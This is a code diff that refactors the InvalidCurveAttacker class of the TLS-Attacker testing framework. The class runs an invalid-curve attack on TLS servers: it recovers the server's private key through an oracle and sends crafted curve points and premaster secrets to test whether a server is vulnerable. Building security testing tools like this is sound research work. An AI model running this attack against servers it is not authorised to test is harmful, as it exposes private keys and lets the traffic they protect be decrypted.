@@ -19,10 +19,8 @@ import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
 import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.core.constants.RunningModeType;
-import de.rub.nds.tlsattacker.core.crypto.ec.Curve;
 import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
-import de.rub.nds.tlsattacker.core.crypto.ec.DivisionException;
-import de.rub.nds.tlsattacker.core.crypto.ec.ECComputer;
+import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
 import de.rub.nds.tlsattacker.core.crypto.ec.Point;
 import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
 import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
@@ -63,13 +61,13 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     @Override
     public void executeAttack() {
         Config tlsConfig = getTlsConfig();
-        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultClientNamedGroups()
-                .get(0));
-        Curve curve = CurveFactory.getNamedCurve(tlsConfig.getDefaultClientNamedGroups().get(0).name());
+        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup()
+                .name());
+        EllipticCurve curve = CurveFactory.getCurve(tlsConfig.getDefaultSelectedNamedGroup());
         RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
-        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
-        attacker.attack();
-        BigInteger result = attacker.getResult();
+        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
+                tlsConfig.getDefaultSelectedNamedGroup());
+        BigInteger result = attacker.attack();
         LOGGER.info("Result found: {}", result);
     }
 
@@ -84,30 +82,21 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                     + getTlsConfig().getDefaultSelectedCipherSuite().name());
             return null;
         }
-        ECComputer computer = new ECComputer();
-        Curve curve = CurveFactory.getNamedCurve(config.getNamedGroup().getJavaName());
-        computer.setCurve(curve);
-        Point point = new Point(config.getPublicPointBaseX(), config.getPublicPointBaseY());
-        for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
-            if (config.getPremasterSecret() != null) {
-                premasterSecret = config.getPremasterSecret();
-            } else {
+        EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
+        Point point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
+                config.getNamedGroup());
 
-                computer.setSecret(BigInteger.valueOf(i + 1));
-                try {
-                    premasterSecret = computer.mul(point).getX();
-                    if (premasterSecret == null) {
-                        premasterSecret = BigInteger.ZERO;
-                    }
-                    LOGGER.debug(premasterSecret.toString());
-                } catch (DivisionException e) {
-                }
-            }
+        int protocolFlows = getConfig().getProtocolFlows();
+        if (config.getPremasterSecret() != null) {
+            protocolFlows = 1;
+        }
+
+        for (int i = 0; i < protocolFlows; i++) {
+            setPremasterSecret(curve, i, point);
             try {
                 WorkflowTrace trace = executeProtocolFlow();
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
                     LOGGER.info("Did not receive ServerHello. Check your config");
-
                     return null;
                 }
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
@@ -117,10 +106,24 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                     return true;
                 }
             } catch (WorkflowExecutionException ex) {
-                LOGGER.debug(ex.getLocalizedMessage());
+                LOGGER.warn(ex);
             }
         }
         return false;
+    }
+
+    private void setPremasterSecret(EllipticCurve curve, int i, Point point) {
+        if (config.getPremasterSecret() != null) {
+            premasterSecret = config.getPremasterSecret();
+        } else {
+            Point sharedPoint = curve.mult(new BigInteger("" + (i + 1)), point);
+            if (sharedPoint.getX() != null) {
+                premasterSecret = sharedPoint.getX().getData();
+            } else {
+                premasterSecret = BigInteger.ZERO;
+            }
+            LOGGER.debug("PMS: " + premasterSecret.toString());
+        }
     }
 
     private WorkflowTrace executeProtocolFlow() {
@@ -147,7 +150,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
         message.prepareComputations();
         message.getComputations().setPremasterSecret(pms);
-        LOGGER.info("working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
+        LOGGER.info("Working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
         workflowExecutor.executeWorkflow();
         return trace;
     }
